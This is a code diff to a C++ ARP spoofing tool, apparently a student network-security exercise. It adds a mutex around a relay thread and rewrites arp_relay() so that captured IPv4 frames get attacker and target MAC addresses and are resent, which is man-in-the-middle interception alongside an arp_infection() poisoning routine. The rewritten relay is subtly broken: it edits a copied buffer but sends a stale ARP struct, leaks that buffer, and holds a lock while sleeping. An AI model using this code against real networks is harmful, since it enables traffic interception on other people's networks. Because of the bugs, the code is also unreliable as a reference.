@@ -11,6 +11,9 @@
 #include <unistd.h>
 #include <vector>
 #include <thread>
+#include <mutex>
+
+
 
 #pragma pack(push, 1)
 
@@ -43,6 +46,8 @@ bool send_arp_request(pcap_t* dev, Mac my_mac, Ip my_ip, Ip target_ip, Mac& targ
 bool getMacIpAddr(string &iface_name, Mac& mac_addr, Ip& ip_addr);
 bool arp_infection(pcap_t* dev, Mac attack_mac, Mac sender_mac, Ip sender_ip, Ip target_ip);
 bool arp_relay(pcap_t* dev, Mac attack_mac, Mac target_mac, Ip sender_ip, Ip target_ip);
+
+std::mutex pcap_mutex;
 
 int main(int argc, char *argv[]) {
     if ((argc & 1) || (argc < 4)) {
@@ -112,7 +117,8 @@ int main(int argc, char *argv[]) {
         //thread
         threads.push_back(thread([=,&running](){
             while (running) {
-                // sender→target 방향의 ARP 패킷만 계속 캡처→재전송
+                // sender→target capture
+                lock_guard<mutex> lk(pcap_mutex);
                 arp_relay(pcap, attacker_mac, send_tar_macs[i].target,
                     send_tar_ips[i].sender, send_tar_ips[i].target);
                 sleep(5);
@@ -266,21 +272,30 @@ bool arp_relay(pcap_t* pcap, Mac attack_mac, Mac target_mac, Ip sender_ip, Ip ta
             break;
         }
 
-        memcpy(&pkt, recv_pkt, sizeof(EthArpPacket));
-        if (ntohs(pkt.eth_.type_) != EthHdr::Arp) continue;
-        if (ntohs(pkt.arp_.op_) != ArpHdr::Request) continue;
-        if (ntohl(pkt.arp_.sip_) != sender_ip) continue;
-        if (ntohl(pkt.arp_.tip_) != target_ip) continue;
-        break;
+        long long len = header->caplen;
+        u_char* buf = new u_char[len]; //동적 할당
+        memcpy(buf, recv_pkt, len);
+
+        EthHdr* ethhdr = reinterpret_cast<EthHdr*>(buf);
+
+        if (ntohs(ethhdr->type()) != EthHdr::Ip4) {
+            delete[] buf;
+            continue;
+        }
+        //IpHdr 쓰기
+        //case로 재감염, relay를 구분
+
+        ethhdr->smac_ = attack_mac;
+        ethhdr->dmac_ = target_mac;
+        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
+        if (res != 0) {
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+            return false;
+        }
+
+
     }
 
-    pkt.eth_.smac_ = Mac(string(attack_mac));
-    pkt.eth_.dmac_ = Mac(string(target_mac));
 
-    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
-    if (res != 0) {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-        return false;
-    }
     return true;
 }
